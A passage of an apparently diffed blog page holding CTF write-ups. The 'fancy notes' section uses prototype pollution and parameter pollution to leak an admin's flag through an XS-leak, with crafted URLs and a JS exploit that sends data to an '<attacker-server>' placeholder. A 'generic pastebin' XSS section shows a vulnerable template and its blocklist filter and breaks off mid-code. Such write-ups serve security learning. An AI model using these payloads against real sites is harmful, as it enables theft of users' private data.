+        srcset="/static/8cbc8445507766b01e8060f08d66e763/c26ae/jinjail-flag.png 158w,
+/static/8cbc8445507766b01e8060f08d66e763/6bdcf/jinjail-flag.png 315w,
+/static/8cbc8445507766b01e8060f08d66e763/29f4e/jinjail-flag.png 506w"
+        sizes="(max-width: 506px) 100vw, 506px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<hr>
+<h1 id="fancy-notes" style="position:relative;"><a href="#fancy-notes" aria-label="fancy notes permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fancy notes</h1>
+<p>This challenge involved client-side prototype pollution + http parameter pollution to achieve XS leaks.</p>
+<p>The website is your typical note storing application. The main detail to note is <code class="language-text">/report</code>, which can be used to send a link to an admin bot to view, meaning the challenge will involve some sort of client side vulnerability. The flag is stored in the admin’s note (as shown by reading the source code). The player can conclude that the goal is leaking the contents of the admin’s note.</p>
+<p>After registering and uploading a note, it can be stylized at <code class="language-text">/fancy</code>.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 487px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQoz6WS3U6EMBCFef/H0iKY4IVhMaKYuGgrpTOdsNyU/q1hN2yUkKhxbjo56TdnetLk+I9KzkcIgYgE50KIcRw1akAcDwcA4JwTUdvupZREhIjTZL/BkzFlWbLrK8bSXfWQpizPb9/afZblWXZTFHdVtWOMFUVxX5aT/QLHGJ1zxxgvW8RTHxdl7hYlhOCXCzPsnFNKISIRaa2l7KWUXScBQQjRK6UUyE4CgNZ6GAbU2p7Mk1UGMUZrnbVuMtMMARpjzkpc/NeBrfjgPQK884+uk33fXx6ynfbmiLp+eW5eN7EfYO/9Y9081Y334c/wbz7JJ5N+QltJS7TUAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="/fancy"
+        title="/fancy"
+        src="/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png"
+        srcset="/static/003ec0571b85b62af50496ff999c6fa6/c26ae/fancy-get.png 158w,
+/static/003ec0571b85b62af50496ff999c6fa6/6bdcf/fancy-get.png 315w,
+/static/003ec0571b85b62af50496ff999c6fa6/7b439/fancy-get.png 487w"
+        sizes="(max-width: 487px) 100vw, 487px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>Entering a note’s name <em>or content</em> will display the note with some fancy styling. Note how the query is passed via GET parameter, and the note can be searched via the content itself rather than just the title. These factors should strongly indicate XS leaks. So, we can make an admin access their note by sending a link with parts of the flag as the get parameter, but how can we determine whether or not the page displays the note?</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/16d513157456cd7a6dbbafa277508d6c/d2f5c/fancy-note.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 62.0253164556962%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABtUlEQVQoz42PwUtUQRyA36VbF/8RkRIjxEPRQaQ6iHhRt3NR0EUMlaUiOnTtUqSgrvug1dWlR+z6dt7MvOeub2feW3ffblqBIMJW0sXw4sbOzE+eCau5WsN3mvm++c1oxF7F1EGYIkxNREIsspQyZubiemIxpr+fjenJlGEikl5BGdPKmNZKFmPqEHtVAwUhZ5as1+Xevtrbl/XfLY6PKk2wiqBc2N4pMA9JILGABCoIzP4WKBduoAGrAOZAvSa2B+m8iqVlwpRJpOIZSOfDzZMO4dA6pr4kTDlFWNsIcUqKsP+NJXaBfaktJz88u5d6HtlejgPfFJb7jzickK9uzU/Njfa/eXTrwW1tsvfSRu9gdqT/s/4Wcp9C4fzJ/OgKfzF6Z2xAezJ4eeJuW6mnMxiNHBAXqP9HuODZXNEAyi9qxnX27qo7fWXbuAZBVNFys7wglmQdgvFd0r1j3NhJ3dw1e6A8JnGx1Z95FYgHtn+M4ym8/iv6+Ov9rtzrdk9vLz/t+DEcUdgDx29q1INCRWuslRpZt2EVmhD2beBhsauvOjtU+zjyPfby56sZQdgpB7mNXPEQyIY8jeoLzrcAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="a fancy note"
+        title="a fancy note"
+        src="/static/16d513157456cd7a6dbbafa277508d6c/f058b/fancy-note.png"
+        srcset="/static/16d513157456cd7a6dbbafa277508d6c/c26ae/fancy-note.png 158w,
+/static/16d513157456cd7a6dbbafa277508d6c/6bdcf/fancy-note.png 315w,
+/static/16d513157456cd7a6dbbafa277508d6c/f058b/fancy-note.png 630w,
+/static/16d513157456cd7a6dbbafa277508d6c/40601/fancy-note.png 945w,
+/static/16d513157456cd7a6dbbafa277508d6c/78612/fancy-note.png 1260w,
+/static/16d513157456cd7a6dbbafa277508d6c/d2f5c/fancy-note.png 1363w"
+        sizes="(max-width: 630px) 100vw, 630px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>The stylization of the note is handled by client-side javascript:</p>
+<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fancify</span><span class="token punctuation">(</span><span class="token parameter">note</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	color <span class="token operator">=</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>style <span class="token operator">||</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	image <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>image <span class="token operator">||</span> <span class="token string">'/static/images/success.png'</span><span class="token punctuation">;</span>
+	styleElement <span class="token operator">=</span> note<span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	styleElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> style<span class="token punctuation">;</span>
+	note<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">animation</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>color<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+	img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	img<span class="token punctuation">.</span>src <span class="token operator">=</span> image
+	note<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+args <span class="token operator">=</span> Arg<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
+noteElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'note'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span>noteElement<span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token function">fancify</span><span class="token punctuation">(</span>noteElement<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre></div>
+<p>The GET parameters are parsed with <code class="language-text">Arg.parse(location.search)</code>. What is <code class="language-text">Arg</code>? Arg.js is a javascript library for parsing arguments. This library is vulnerable to prototype pollution.</p>
+<p>Furthermore, we see that <code class="language-text">fancify(note)</code> sets the image src to <code class="language-text">/static/images/success.png</code> if <code class="language-text">this.image</code> does not exist. Using prototype pollution, we can set <code class="language-text">this.image</code> to anything we want! If we craft a link which will pollute <code class="language-text">this.image</code> to point to our attacker controlled server, and supply a query of <code class="language-text">idek{a</code> and send it to the bot, we can detect if the flag contains <code class="language-text">idek{a</code>!</p>
+<p>We can repeat this process for each character until we leak the entire flag.</p>
+<p>However, the challenge is not over here. If we attempt to supply the link: <code class="language-text">http://localhost:1337/fancy?q=idek{t&amp;style=1&amp;__proto__[image]=http://&lt;attacker-server></code>, we receive an error message from the server.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 476px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 57.59493670886076%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWUlEQVQoz5WS0W7bMAxF8///tKV92brAGdpm9Qc0tkVJNE3FTmeJslQ4cZsiQIDtvPGCF5QuucofpJxTSvkG0zQtbV96VjlnEfm9Lb59nynLcrPZFEWx2z0/Pj79+Plwf3f38me3Xq8ffs36S1mKxIs5pdS2uK/2WmtjTFVVAMDMRASgAZRzziKC1vV+Tx1fJosEozV1PPQ9M3ddNwyDc46ZHXM/zGJL5E7l8Xicy5bOj1/FKABgjFVNg4jWWj0DdV03TWOMUaqBswRgrQWtFcAyOU6T9z4EH0QkBO/HEMLofTzhvZeTPo5jjFMUiTGKyDm/lfceEXl+5YGZ9fxJXdeNNVYp1SgABdZYrcEdDkR06HsiCiJLYJdtpRTjFHxokRBbIrIWEVuR+JnwV5a0rzbsHCtYeHv7m69PIF3MV5z7lNLb7fMwHPPt47lpfn2ttsUTYvd/5n/nHVc8r0DAqE5KAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="param error"
+        title="param error"
+        src="/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png"
+        srcset="/static/a3ce2c71b2c6b1a290cf63298f8ec379/c26ae/fancy-param-error.png 158w,
+/static/a3ce2c71b2c6b1a290cf63298f8ec379/6bdcf/fancy-param-error.png 315w,
+/static/a3ce2c71b2c6b1a290cf63298f8ec379/f2205/fancy-param-error.png 476w"
+        sizes="(max-width: 476px) 100vw, 476px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>If we check the source code, we see that the server only expects the value of parameters which are not <code class="language-text">q</code> to be 1 character long.</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/fancy'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">fancify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'q'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>
+        <span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">and</span> k <span class="token operator">!=</span> <span class="token string">'q'</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">filter</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            results <span class="token operator">=</span> find_note<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> results<span class="token punctuation">:</span>
+                message <span class="token operator">=</span> <span class="token string">'here is your 𝒻𝒶𝓃𝒸𝓎 note!'</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                message <span class="token operator">=</span> <span class="token string">'no notes found!'</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'fancy.html'</span><span class="token punctuation">,</span> note<span class="token operator">=</span>results<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'fancy.html'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'bad format! Your style params should not be so long!'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'fancy.html'</span><span class="token punctuation">)</span></code></pre></div>
+<p>The snipper which controls this is here:</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">and</span> k <span class="token operator">!=</span> <span class="token string">'q'</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre></div>
+<p>In short, if we have a key which is not <code class="language-text">q</code>, the length of its value must not be greater than 1. If a value is greater than 1, the check will not be passed and we will instead receive the message informing us.</p>
+<p>However, our useage of Arg.js is not over yet! As the <code class="language-text">__proto__[image]</code> parameter only needs to be accessed on the client side by Arg.js, what if we craft a url that flask believes is valid, which still allows for any length of value on the client side? As we are parsing the parameters both server-side and client-side, there may be some differences between the two parsers.</p>
+<p>In flask, if a duplicate parameter is encountered, the first appearance is used. In Arg.js, the last is used. With this in mind, <code class="language-text">http://localhost:1337/fancy?q=idek{t&amp;style=1&amp;__proto__[image]=x&amp;__proto__[image]=http://&lt;attacker-server></code> will accomplish our goal. Flask thinks <code class="language-text">__proto__[image]</code> is <code class="language-text">x</code>, while Arg.js thinks it is the link to our server.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/8f3d34700ab6b88cac118e4151bcd364/33c9c/fancy-parameter-pollution.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 45.56962025316456%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9ElEQVQoz52N3WqDQBCF9137Y1ZFbZpXawlEqzVJ01TtTaEQaNhKYqvEXU0iQgvOlHgRSNyrDh+H4XDODFH1vm4MdGPQUy1V71PtRqGmQq2eainUpNphOUDNiyvtyOW1rhm3pGkaAMB/DelaACA4L4tit92VZVkIITiXPiDSk9u6+s432SbnuUhzXlR7QGn5MzmHfWGcAUt4/JGuFg1bY5whS7pJgqPZGT/2pHL82hkvJ8P36V3tjGvH/7Wn3STBx/CUaPXsvkb3y7m9eBmtZx6bP7yFw/TJRy+C0zBBL+gQohu2GoAXoNs6klggLbedVo9Iy39KNcnBCz6j5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="parameter pollution achieved"
+        title="parameter pollution achieved"
+        src="/static/8f3d34700ab6b88cac118e4151bcd364/f058b/fancy-parameter-pollution.png"
+        srcset="/static/8f3d34700ab6b88cac118e4151bcd364/c26ae/fancy-parameter-pollution.png 158w,
+/static/8f3d34700ab6b88cac118e4151bcd364/6bdcf/fancy-parameter-pollution.png 315w,
+/static/8f3d34700ab6b88cac118e4151bcd364/f058b/fancy-parameter-pollution.png 630w,
+/static/8f3d34700ab6b88cac118e4151bcd364/40601/fancy-parameter-pollution.png 945w,
+/static/8f3d34700ab6b88cac118e4151bcd364/33c9c/fancy-parameter-pollution.png 1133w"
+        sizes="(max-width: 630px) 100vw, 630px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>Finally, we are able to craft an exploit which will leak the admin’s flag to our server.</p>
+<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_'</span>
+<span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token string">'idek{'</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">checkFlag</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:1337/fancify?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;style=1&amp;__proto__[image]=x&amp;__proto__[image]=http://&lt;attacker-server>/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> chars<span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token function">checkFlag</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> c<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+</code></pre></div>
+<p>We can send the admin a link to our exploit and iterate the <code class="language-text">flag</code> variable for each character we leak until we have the full flag.</p>
+<hr>
+<h1 id="generic-pastebin-challenge" style="position:relative;"><a href="#generic-pastebin-challenge" aria-label="generic pastebin challenge permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>generic pastebin challenge</h1>
+<p>This was an xss challenge with a few solutions. My intended solution involved using an unclosed <code class="language-text">srcdoc</code> attribute on an iframe to bypass the the filter.</p>
+<p>As implied by the title, the application is a simple pastebin, where we can store notes and access later with the link. User’s can only access their own notes, with the exception of the admin, who can view all notes. Reading the source, we can confirm that the flag is stored in the admin’s note, which is located at <code class="language-text">/flag</code>.</p>
+<p>The title and content of our pastes are properly sanitized.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 236px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 51.89873417721519%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQoz6WR3U6DQBCFef8HsG9gTDSV4EXLX2uAegGpiRCQH2u1FzXSWkqhsgs7u6ZiEFGvOheTyeR82TN7OHZEcc0EAE2nlAJA0+tNPdSCLswYQ6ggACUuAWh7v0u3BcJASFlWf7wMQBz7jr/sj8aaPBzoxk0QhGEQeK7r+wHfvzg9Ozd0XZKV6fQW4eonTCpFllRF4oUr0zI1TZ9MjF7vZDAURVHUtGtBENTR2LJMWVH3BerappSSitQuDudRijBmjOV5nqbpl4CQ+vIuTMjBTPG+j0LfdtzF4tnz7p/m82j26Dp29DDbZfmn7JvnOr9flThJNq9xnGfZcvmyiuP122a9ipNkixD+N6qjcm5XO9sm4d/wB0oVOdgow7X1AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="sanitized paste"
+        title="sanitized paste"
+        src="/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png"
+        srcset="/static/130972da40e450dd06b46ab56ce79c8c/c26ae/sanitized.png 158w,
+/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png 236w"
+        sizes="(max-width: 236px) 100vw, 236px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+  </a>
+    </span></p>
+<p>In the jinja2 layout which is used for every page, we can see that the flashes are passed with the <code class="language-text">|safe</code> filter, which will now sanitize any HTML passed to it.</p>
+<div class="gatsby-highlight" data-language="jinja2"><pre class="language-jinja2"><code class="language-jinja2"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
+<span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{%</span> <span class="token tag keyword">for</span> <span class="token variable">message</span> <span class="token keyword">in</span> <span class="token function">get_flashed_messages</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">%}</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flashes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span><span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{{</span><span class="token variable">message</span><span class="token operator">|</span><span class="token filter function">safe</span><span class="token delimiter punctuation">}}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>
+<span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{%</span> <span class="token tag keyword">endfor</span> <span class="token delimiter punctuation">%}</span></span>
+<span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{%</span> <span class="token tag keyword">block</span> <span class="token variable">body</span> <span class="token delimiter punctuation">%}</span></span>
+<span class="token jinja2 language-jinja2"><span class="token delimiter punctuation">{%</span> <span class="token tag keyword">endblock</span> <span class="token delimiter punctuation">%}</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>footer<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>content has-text-centered<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+                Made with "love" by downgrade
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre></div>
+<p>The code responsible for adding flashed messages to a page is here. In short, the <code class="language-text">error</code> param is inserted into the page, but only if it passes the filter. The value of <code class="language-text">error</code> must not contain any event handlers, and also cannot contain <code class="language-text">script</code>, <code class="language-text">svg</code>, <code class="language-text">object</code>, <code class="language-text">img</code>, <code class="language-text">/</code>, <code class="language-text">:</code>, or <code class="language-text">></code>.</p>
+<div class="gatsby-highlight" data-language="py"><pre class="language-py"><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span>
+<span class="token keyword">def</span> <span class="token function">add_flashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'error'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        msg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># no event handlers</span>
+        <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>bad_string <span class="token keyword">in</span> msg <span class="token keyword">for</span> bad_string <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'on'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+        <span class="token comment"># none of this shit</span>
+        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>bad_string <span class="token keyword">in</span> msg <span class="token keyword">for</span> bad_string <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'script'</span><span class="token punctuation">,</span> <span class="token string">'svg'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'img'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+
